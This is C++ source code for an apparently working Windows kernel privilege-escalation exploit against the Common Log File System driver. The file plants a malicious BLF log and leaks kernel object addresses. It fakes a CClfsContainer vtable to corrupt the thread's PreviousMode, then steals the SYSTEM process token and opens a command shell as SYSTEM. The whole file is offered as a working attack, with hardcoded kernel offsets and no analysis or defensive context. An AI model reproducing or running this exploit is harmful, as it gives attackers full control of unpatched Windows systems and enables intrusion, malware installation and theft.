#include <Windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <psapi.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <clfsw32.h>
#include "headers.h"

#pragma comment(lib, "Clfsw32.lib")

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define SystemHandleInformation ((SYSTEM_INFORMATION_CLASS)16)

#define POFXPROCESSORNOTIFICATION_OFFSET 0x003ad3b0
#define DBGKPTRIAGEDUMPRESTORESTATE_OFFSET 0x007f83b0
#define Offset_PreviousMode 0x232
#define Offset_Token 0x4b8

DWORD64 GetBaseAddr(LPCWSTR name)
{
    BOOL status;
    LPVOID* pImageBase;
    DWORD ImageSize;
    WCHAR driverName[1024];
    DWORD64 driverBase = 0;

    status = EnumDeviceDrivers(nullptr, 0, &ImageSize);

    pImageBase = (LPVOID*)VirtualAlloc(nullptr, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    status = EnumDeviceDrivers(pImageBase, ImageSize, &ImageSize);

    int driver_count = ImageSize / sizeof(pImageBase[0]);

    for (int i = 0; i < driver_count; i++) {
        GetDeviceDriverBaseNameW(pImageBase[i], driverName, sizeof(driverName) / sizeof(char));

        if (!wcscmp(name, driverName)) {
            driverBase = (DWORD64)pImageBase[i];
            break;
        }
    }

    return driverBase;
}

PVOID FindObject(int pid, HANDLE dHandle) {

    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        printf("[-] Unable to find ntdll!NtQuerySystemInformation\n");
        return FALSE;
    }

    ULONG returnLen = 0x1000;
    NTSTATUS status;

    PSYSTEM_HANDLE_INFORMATION SystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)returnLen);

    do {
        if (SystemHandleInfo) {
            HeapFree(GetProcessHeap(), 0, SystemHandleInfo);
        }

        SystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLen);
        if (!SystemHandleInfo) {
            printf("[-] HeapAlloc Failed With Error: %d\n", GetLastError());
            return FALSE;
        }

        status = NtQuerySystemInformation(SystemHandleInformation, SystemHandleInfo, returnLen, &returnLen);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    PVOID dKTHREAD = NULL;
    for (ULONG i = 0; i < SystemHandleInfo->NumberOfHandles; i++)
    {
        if (SystemHandleInfo->Handles[i].UniqueProcessId == pid)
        {
            if (dHandle == (HANDLE)SystemHandleInfo->Handles[i].HandleValue)
            {
                dKTHREAD = SystemHandleInfo->Handles[i].Object;
                free(SystemHandleInfo);
                break;
            }
        }
    }
    // HeapFree(GetProcessHeap(), 0, SystemHandleInfo);
    return dKTHREAD;
}

int main(int argc, char* argv[]) {

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <Malicious BLF File>\n", argv[0]);
        return 1;
    }

    const char* maliciousBLF = argv[1];

    wchar_t logFilePath[MAX_PATH];
    wchar_t llogFilePath[MAX_PATH];
    wchar_t containerFilePath[MAX_PATH];

    // Step 1: Creating Legitimate BLF File
    const wchar_t* directoryName = L"C:\\temp\\testlog";
    CreateDirectoryW(directoryName, NULL);
    wprintf(L"[+] Successfully created %s directory!\n", directoryName);

    swprintf(logFilePath, MAX_PATH, L"LOG:%s\\mylogdddd.blf", directoryName);
    wprintf(L"[+] Log file path: %s\n", logFilePath);
    HANDLE lHandle = CreateLogFile(logFilePath,
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        0);

    if (lHandle == INVALID_HANDLE_VALUE) {
        printf("[-] CreateLogFile failed with error %d\n", GetLastError());
        return 1;
    }
    else {
        printf("[+] Successfully created the log file!\n");
    }

    ULONGLONG cbContainer = (ULONGLONG)0x80000;
    swprintf(containerFilePath, MAX_PATH, L"%s\\container1", directoryName);
    wprintf(L"[+] Container file path: %s\n", containerFilePath);
    if (!AddLogContainer(lHandle, &cbContainer, containerFilePath, NULL)) {
        printf("AddLogContainer failed with error %d\n", GetLastError());
    }
    else {
        printf("[+] Successfully created the container!\n");
    }

    CloseHandle(lHandle);

    // Step 2: Overwriting Legitimate BLF file with Malicious BLF file
    FILE* malblfFile = NULL;
    errno_t err = fopen_s(&malblfFile, maliciousBLF, "rb");
    if (err != 0 || malblfFile == NULL) {
        printf("[-] Failed to open the malicious BLF file");
        return 1;
    }

    fseek(malblfFile, 0, SEEK_END);
    long fileSize = ftell(malblfFile);
    rewind(malblfFile);

    char* buffer = (char*)malloc(fileSize);
    if (!buffer) {
        printf("[-] Memory allocation failed\n");
        fclose(malblfFile);
        return 1;
    }

    if (fread(buffer, 1, fileSize, malblfFile) != fileSize) {
        printf("[-] Error reading the malicious BLF file");
        free(buffer);
        fclose(malblfFile);
        return 1;
    }
    fclose(malblfFile);

    swprintf(llogFilePath, MAX_PATH, L"%s\\mylogdddd.blf.blf", directoryName);
    FILE* outputFile = NULL;
    errno_t err2 = _wfopen_s(&outputFile, llogFilePath, L"wb");
    if (err2 != 0 || outputFile == NULL) {
        printf("[-] Error opening the legitimate BLF file");
        free(buffer);
        return 1;
    }

    if (fwrite(buffer, 1, fileSize, outputFile) != fileSize) {
        perror("[-] Error over writing the legitimate BLF file");
    }

    fclose(outputFile);
    free(buffer);
    printf("[+] Successfully overwritten the legitimate BLF file with malicious BLF file\n");

    // getchar();

    // Step 3: Retriving all required values

    DWORD64 ntoskrnl_base = GetBaseAddr(L"ntoskrnl.exe");
    printf("[+] NT base address %llx\n", ntoskrnl_base);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
    PVOID curEPROCESS = FindObject(GetCurrentProcessId(), hProcess);

    if (curEPROCESS == NULL) {
        printf("[-] Unable to find EPROCESS of the current process!\n");
        return 1;
    }

    printf("[+] Found EPROCESS of the current process %p\n", curEPROCESS);

    PVOID sysEPROCESS = FindObject(4, HANDLE(0x4));

    if (sysEPROCESS == NULL) {
        printf("[-] Unable to find EPROCESS of the system.exe\n");
        return 1;
    }

    printf("[+] Found EPROCESS of the system.exe %p\n", sysEPROCESS);

    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    PVOID curKTHREAD = FindObject(GetCurrentProcessId(), hThread);

    if (curKTHREAD == NULL) {
        printf("[-] Unable to find KTHREAD of the current thread!\n");
        return 1;
    }

    printf("[+] Found KTHREAD of the current thread %p\n", curKTHREAD);

    // Step 4: Setting up Fake CClfsContainer

    PVOID CClfsContainer = VirtualAlloc((LPVOID)0x2100000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memset(CClfsContainer, 0, 0x1000);

    DWORD64 vftable = (DWORD64)CClfsContainer + 0x100;
    ((PDWORD64)vftable)[1] = (DWORD64)ntoskrnl_base + POFXPROCESSORNOTIFICATION_OFFSET;
    *(PDWORD64)CClfsContainer = (DWORD64)vftable;

    // nt!PoFxProcessorNotification() 
    PVOID arg_POFXPROCESSORNOTIFICATION = CClfsContainer;
    *(PDWORD64)((PCHAR)arg_POFXPROCESSORNOTIFICATION + 0x40) = (DWORD64)CClfsContainer + 0x200;  // v1 = rcx + 0x40
    *(PDWORD64)((PCHAR)arg_POFXPROCESSORNOTIFICATION + 0x200 + 0x68) = (DWORD64)ntoskrnl_base + DBGKPTRIAGEDUMPRESTORESTATE_OFFSET; // v3 = v1 + 0x68 ; Pointer to DbgkpTriageDumpRestoreState
    *(PDWORD64)((PCHAR)arg_POFXPROCESSORNOTIFICATION + 0x48) = (DWORD64)CClfsContainer + 0x300;  // argument for DbgkpTriageDumpRestoreState()

    // nt!DbgkpTriageDumpRestoreState()
    DWORD64 arg_DBGKPTRIAGEDUMPRESTORESTATE = (DWORD64)CClfsContainer + 0x300;
    PVOID thread_previousmode = (PVOID)((DWORD64)curKTHREAD + Offset_PreviousMode);
    *((PDWORD64)(arg_DBGKPTRIAGEDUMPRESTORESTATE)) = (DWORD64)thread_previousmode - 0x2078; // *(_DWORD *)(v1 + 0x2078) ; Address where it writes
    *((PDWORD64)((PCHAR)arg_DBGKPTRIAGEDUMPRESTORESTATE + 0x10)) = 0x0014000000000f00;  // Value that writes to the address
    
    printf("[+] Fake CClfsContainer = 0x%llx\n", (DWORD64)CClfsContainer);

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    // Step 5: Triggering the Vulnerability
    HANDLE mHandle = CreateLogFile(logFilePath,
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        0);

    if (mHandle == INVALID_HANDLE_VALUE) {
        printf("[+] CreateLogFile failed with error %d, this is good!\n", GetLastError());
    }

    SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

    // Step 6: Stealing system.exe Token

    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtWriteVirtualMemory");

    if (!NtWriteVirtualMemory) {
        printf("[-] Unable to find ntdll!NtWriteVirtualMemory\n");
        return FALSE;
    }

    printf("[+] Stealing system's Token..\n");
    NtWriteVirtualMemory(GetCurrentProcess(), PVOID((DWORD64)curEPROCESS + Offset_Token), PVOID((DWORD64)sysEPROCESS + Offset_Token), 0x8, NULL);

    printf("[+] Replacing KTHREAD.PreviousMode as UserMode..\n");
    KPROCESSOR_MODE mode = UserMode;
    NtWriteVirtualMemory(GetCurrentProcess(), PVOID((DWORD64)curKTHREAD + Offset_PreviousMode), &mode, sizeof(mode), NULL);

    printf("[+] Spawning shell as SYSTEM...\n");
    system("cmd.exe");

    return 0;
}